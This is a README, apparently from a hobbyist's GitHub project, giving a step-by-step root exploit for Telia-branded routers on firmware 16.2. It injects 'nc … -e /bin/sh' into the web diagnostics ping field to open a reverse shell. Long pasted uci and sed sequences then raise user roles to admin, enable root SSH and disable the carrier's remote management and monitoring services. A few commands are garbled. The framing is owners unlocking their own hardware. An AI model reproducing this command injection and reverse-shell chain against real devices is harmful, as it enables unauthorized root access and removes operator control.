![alt text](https://sendit.nu/f/9ym%21h%3FmGl42ctJ.png)

# README

   Telia users finally can unlock their router and gets more features. 
   
   This exploit is for firmware: 16.2

   Note that if you rent your router from your carrier, you will be liable for repayment if you bricking your device. 
   If you follow my guide then everything will be fine, I will not take any responsibility if you bricking your device !!!
   Hack the router at your own risk!
  
   With that said, lets get started ;)

# HOWTO

   Set up a netcat listener on your machine, 
   and adjust any firewall rules to allow an inbound connection:
      
    nc -lvvp [machine_port]
  
 ![alt text](https://sendit.nu/f/TDoddJrPKo_qpk.png)

   Go to the ping/traceroute diagnostics page in the gateway’s Web management, 
   and enter the following:
  
    :::::::`nc [machine_IP] [machine_port] -e /bin/sh`

## Here i providing a picture aswell: 

![alt text](https://sendit.nu/f/-JBSlHHo%21E72A.png)

## You should see it like this now:

![alt text](https://sendit.nu/f/c_rqGB_%3Faux89f.png)

### Set your password and then copy / paste:

    uci add_list web.assistancemodal.roles='admin' 
    uci add_list web.usermgrmodal.roles='admin'
    uci add_list web.todmodal.roles='admin'
    uci add_list web.iproutesmodal.roles='admin'
    uci add_list web.cwmpconf.roles='admin'
    uci add_list web.relaysetupmodal.roles='admin'
    uci add_list web.xdsllowmodal.roles='admin'
    uci add_list web.natalghelper.roles='admin'
    uci add_list web.mmpbxglobalmodal.roles='admin' 
    uci add_list web.mmpbxprofilemodal.roles='admin' 
    uci sed -i s/xx.xx.xx.xx/xx.xx.xx.xx/g /etc/config/dropbear # Whois the ip you will see here, This is a back door!!
    sed -i s/xx.xx.xx.xx/xx.xx.xx.xx/g /etc/config/dropbear # Whois the ip you will see here, This is a back door!!!
    sed -i '1,18 s/^/#/' /etc/config/dropbear
    sed -i '20s/off/on/' /etc/config/dropbear 
    sed -i '21s/off/on/' /etc/config/dropbear
    sed -i '24s/0/1/' /etc/config/dropbear
    sed -i '25s/0/1/' /etc/config/dropbear
    /etc/init.d/nginx restart
    
### ^ Gave you 10 new settings in web interface, go and witness it.

### Now you can continue to copy and paste.

    uci set dropbear.lan.enable='1'
    uci set dropbear.lan.PasswordAuth=on
    uci set dropbear.lan.RootPasswordAuth=on
    uci add_list web.tvoicesipconfig.roles=admin
    uci add_list web.tvoicecontacts.roles=admin
    uci add_list web.tvoicecalllog.roles=admin
    uci add_list web.tvoicecapability.roles=admin
    uci add_list web.parentalblock.roles=admin
    uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
    uci set web.mmpbxinoutgoingmapmodal=rule
    uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
    uci add_list web.mmpbxinoutgoingmapmodal.roles=admin
    uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
    uci set web.mmpbxstatisticsmodal=rule
    uci set web.mmpbxstatisticsmodal.target='/modals/mmpbx-statistics-modal.lp'
    uci add_list web.mmpbxstatisticsmodal.roles=admin
    uci set cwmpd.cwmpd_config.state=0
    uci set cwmpd.cwmpd_config.upgradesmanaged=0
    uci set cwmpd.cwmpd_config.periodicinform_enable=0
    uci set cwmpd.cwmpd_config.acs_pass='0'
    uci set cwmpd.cwmpd_config.acs_user='0'
    uci set cwmpd.cwmpd_config.acs_url='invalid'
    uci set wifi_doctor_agent.config.enabled=0
    uci add_list web.ruleset_main.rules=cwmpconfmodal
    uci set web.cwmpconfmodal=rule
    uci set web.cwmpconfmodal.target='/modals/cwmpconf-modal.lp'
    uci add_list web.cwmpconfmodal.roles=admin
    uci set hotspotd.main.ipv4=0
    uci set hotspotd.main.enable=false
    uci set hotspotd.main.deploy=false
    uci set hotspotd.TLS2G.enable=0
    uci set hotspotd.FON2G.enable=0
    uci add_list web.ruleset_main.rules=iproutesmodal
    uci set web.iproutesmodal=rule
    uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
    uci add_list web.iproutesmodal.roles=admin
    uci add_list web.ruleset_main.rules=systemmodal
    uci set web.systemmodal=rule
    uci set web.systemmodal.target='/modals/system-modal.lp'
    uci add_list web.systemmodal.roles=admin
    uci add_list web.ruleset_main.rules=relaymodal
    uci set web.relaymodal=rule
    uci set web.relaymodal.target='/modals/relay-modal.lp'
    uci add_list web.relaymodal.roles=admin
    uci add_list web.ruleset_main.rules=natalghelpermodal
    uci set web.natalghelpermodal=rule
    uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
    uci add_list web.natalghelpermodal.roles=admin
    uci set tls-vsparc.Config.Enabled='0'
    uci set tls-vsparc.Passive.PassiveEnabled='0'
    uci add_list web.ruleset_main.rules=diagnosticstcpdumpmodal
    uci set web.diagnosticstcpdumpmodal=rule
    uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
    uci add_list web.diagnosticstcpdumpmodal.roles=admin
    uci set system.config.export_plaintext='1'
    uci set system.config.export_unsigned='1'
    uci set system.config.import_plaintext='1'
    uci set system.config.import_unsigned='1'
    uci commit

    sed -e 's/session:hasAccess("\/modals\/diagnostics-network-modal.lp")/session:hasAccess("\/modals\/diagnostics-network-modal.lp") and \n session:hasAccess("\/modals\/diagnostics-tcpdump-modal.lp")/' -i /www/cards/009_diagnostics.lp
    sed -e 's^alt="network"></div></td></tr>\\^alt="network"></div></td>\\\n <td><div data-toggle="modal" data-remote="modals/diagnostics-tcpdump-modal.lp" data-id="diagnostics-tcpdump-modal"><img href="#" rel="tooltip" data-original-title="TCPDUMP" 
    src="/img/network_sans-32.png" alt="network"></div></td></tr>\\^' -i /www/cards/009_diagnostics.lp
    sed -e 's/{"logviewer-modal.lp", T"Log viewer"},/{"logviewer-modal.lp", T"Log viewer"},\n {"diagnostics-tcpdump-modal.lp", T"tcpdump"},\n/' -i /www/snippets/tabs-diagnostics.lp
    sed -e 's/getrole()=="guest"/getrole()=="admin"/' -i /www/snippets/tabs-voice.lp
    sed -e 's/{"mmpbx-sipdevice-modal.lp", T"Sip Device"},/{"mmpbx-sipdevice-modal.lp", T"Sip Device"},\n{"mmpbx-inoutgoingmap-modal.lp", T"In-Out Mapping"},\n{"mmpbx-statistics-modal.lp", T"Statistics"},/' -i /www/snippets/tabs-voice.lp
    sed -e 's/if currentuserrole == "guest" /if currentuserrole == "admin" /' -i /www/docroot/modals/gateway-modal.lp

    echo > /etc/rc.local
    /etc/init.d/nginx restart;
    /etc/init.d/cwmpd disable;
    /etc/init.d/cwmpdboot disable;
    /etc/init.d/wifi-doctor-agent disable;
    /etc/init.d/hotspotd disable;
    /etc/init.d/tls-vsparc disable; 
    killall -9 hotspotd cwmpd cwmpdboot watchdog-tch wifi-doctor-agent tls-vsparc;
    /etc/init.d/dropbear start

#### Serial Console

    /etc/initd
    #ttyS0::askfirst:/bin/login
    echo > /etc/dropbear/authorized_keys

#### Speeding up VDSL sync times

    /etc/initd
    uci del_list xdsl.dsl0.profile='8a'
    uci del_list xdsl.dsl0.profile='8b'
    uci del_list xdsl.dsl0.profile='8c'
    uci del_list xdsl.dsl0.profile='8d'
    uci del_list xdsl.dsl0.profile='12a'
    uci del_list xdsl.dsl0.profile='12b'
    uci del_list xdsl.dsl0.multimode='gdmt'
    uci del_list xdsl.dsl0.multimode='adsl2annexm'
    uci del_list xdsl.dsl0.multimode='adsl2plus'
    uci commit
    reboot

### If you wish to add the selections to the web interface to play with later, you can run the following:
    /etc/initd
    uci add_list web.ruleset_main.rules=xdsllowmodal
    uci set web.xdsllowmodal=rule
    uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
    uci add_list web.xdsllowmodal.roles='admin'
    uci commit

#### Changing max sync speeds

    uci set xdsl.dsl0.maxaggrdatarate='160000'
    uci set xdsl.dsl0.maxdsdatarate='110000'
    uci set xdsl.dsl0.maxusdatarate='40000'
    uci commit xdsl
    reboot

#### Using bridge mode with a dedicated PPPoE ethernet port
  
    uci set network.lan.dns='8.8.8.8'
    uci set network.lan.gateway='10.0.0.254'
    uci set mmpbxrvsipnet.sip_net.interface='lan'
    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
    uci commit

#### You can check the current running dns with

    cat /etc/resolv.conf
    
   Enable web interface features in Bridge Mode
   If you have the modem in bridge mode, the web interface is gutted compared to in routed mode.
   Edit /www/lua/cards_limiter.lua and change the following function to:
   
    'function M.card_limited(info, cardname)
     return false
     if info.bridged then
     return not bridge_limit_list[cardname]
     end
     return false
     end
     /etc/init.d/nginx restart

### Thats it! Have fun ;)



# CONTACT 

     If you have problems, questions, ideas or suggestions please contact
     us by posting to info@sendit.nu

# WEB SITE

     Visit our homepage for the latest info and updated tools

     https://sendit.nu & https://github.com/wuseman/

### END!

